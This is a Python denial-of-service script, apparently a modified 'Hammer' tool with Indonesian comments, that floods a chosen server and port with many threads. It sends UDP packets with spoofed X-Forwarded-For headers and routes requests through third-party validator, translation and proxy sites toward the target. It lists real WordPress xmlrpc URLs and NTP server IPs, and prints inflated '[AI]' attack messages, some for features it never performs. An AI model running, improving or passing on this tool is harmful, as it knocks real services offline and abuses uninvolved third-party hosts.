#dos script hammer
#di edit dan di modifikasi daya tempurnya oleh hendrik
#penambahan fitur2 baru

from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random
code = '/NCD/78hJl6TU8LKiogR'
def user_agent(): #uagent class
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (Linux; U; Android 4.0.3; es-es; i-Joy-Andromeda Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30")
	uagent.append("Mozilla/5.0 (Linux; U; Android 4.0.3; en-gb; i-Joy-Andromeda Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30") 
	uagent.append("Mozilla/5.0 (Linux; U; Android 4.0.3; ru-ru; i-Joy-Andromeda Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30")
	return(uagent)


def my_bots(): #bot class
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("dfwdiesel.net/check?u=")
	bots.append("http://host-tracker.com/check_page/?furl=")
	bots.append("http://jigsaw.w3.org/css-validator/validator?uri=")
	bots.append("http://www.google.com/translate?u=")
	bots.append("http://www.webproxy.net/view?q=")
	bots.append("http://google.com/robots.txt")
	bots.append("http://host-tracker.com/check_page/?furl=")
	bots.append("http://www.google.com/translate?u=")
	bots.append("http://anonymouse.org/cgi-bin/anon-www.cgi/")
	bots.append("http://www.onlinewebcheck.com/?url=")
	bots.append("http://feedvalidator.org/check.cgi?url=")
	bots.append("http://check-host.net/check-http?host=")
	bots.append("http://checksite.us/?url=")
	bots.append("http://jobs.bloomberg.com/search?q=")
	bots.append("http://www.bing.com/search?q=")
	return(bots)
	
def rpcs(): #rcps class
    global rpcs
    rpcs=[]
    rpcs.append("http://missionglobal.com/xmlrpc.php")
    rpcs.append("http://www.formpac.com/xmlrpc.php")
    rpcs.append("http://www.tman.ca/hanas/xmlrpc.php")
    rpcs.append("http://www.niitsuhome.com/wp/xmlrpc.php")
    rpcs.append("https://www.e-publicrealestate.gr/xmlrpc.php")
    return(rpcs)
    
def ntp(): #ntp class
    global ntp
    ntp=[]
    ntp.append("194.164.127.5")
    ntp.append("216.239.35.8")
    ntp.append("128.138.140.44")
    ntp.append("139.78.97.128")
    ntp.append("138.96.64.10")
    ntp.append("200.23.51.102")
    ntp.append("193.79.237.14")
    ntp.append("194.58.203.20")
    ntp.append("194.58.203.148")
    ntp.append("208.91.196.74")
    ntp.append("194.58.202.148")
    ntp.append("192.36.143.151")
    ntp.append("193.62.22.98")
    ntp.append("192.12.19.20")
    return(ntp)

def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94mBots Refreshing\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
		
def rpcs_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'X-Forwarded-For:': random.choice(rpcs)}))
			print("\033[94m[AI] OPEN NEW SESSION RPCS")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n X-Forwarded-For: "+random.choice(rpcs)+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m[INFO] ATTACKING FROM : ",random.choice(bots)), print("[AI] RPCS :",random.choice(rpcs))
				time.sleep(3) #JARAK JEDA ATTACK 3 DETIK
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m [AI] SERVER OFFLINE??\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
  print


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Hammers")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[92m[AI] Target : ", host)
	print("\033[31;1m[AI] STARTING ATTACK...\033[0m")
	time.sleep(5)
	print("\033[92mCONECTING TO RPCS : ",rpcs)
	user_agent()
	my_bots()
	rpcs()
	time.sleep(5)
	print("NTP AMPLIFIER DEFAULD CONNECTING :",ntp)
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91m[AI]",host,"IP TIDAK DI TEMUKAN\033[0m")
		print("\033[91m[AI] BOT : OFFLINE")
		print("\033[91m[AI] NTP AMPLIFIER : OFFLINE")
		print("\033[91m[AI] RPCS : OFF MODE")
		usage()
	while True:
		print("ALL TROPS CONNECTED ON 127.0.0.7 SERVER : ",socket.gethostname())
		time.sleep(3)
		print("BATLLE MODE : ON")
		print("ATTACK CODE : ",code)
		time.sleep(3)
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()